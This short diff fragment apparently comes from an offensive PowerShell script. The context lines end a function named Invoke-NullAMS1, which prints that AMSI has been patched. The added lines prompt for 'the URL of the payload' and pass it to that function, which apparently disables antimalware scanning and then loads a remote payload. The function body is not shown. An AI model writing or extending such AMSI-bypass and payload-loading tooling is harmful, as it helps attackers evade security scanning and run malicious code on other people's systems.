@@ -267,3 +267,8 @@ function Invoke-NullAMS1 {
 
     Write-Host "[*] Successful providers patching, 4MSI patched" -ForegroundColor Green
 }
+
+# Prompt user for URL
+$urlInput = Read-Host "Enter the URL of the payload"
+Invoke-NullAMS1 -url $urlInput
+
